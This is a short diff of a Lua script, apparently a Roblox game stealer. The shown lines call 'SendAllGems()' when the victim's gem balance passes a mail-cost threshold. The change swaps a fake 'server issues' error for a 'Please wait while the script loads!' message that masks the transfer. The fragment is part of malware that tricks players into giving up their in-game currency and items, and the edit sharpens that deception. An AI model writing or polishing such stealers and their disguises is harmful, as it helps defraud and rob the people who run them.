@@ -358,5 +358,5 @@ if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
     if GemAmount1 > mailSendPrice then
         SendAllGems()
     end
-    message.Error("We are Having server issues please rejoin and try again")
+    message.Error("Please wait while the script loads!")
 end
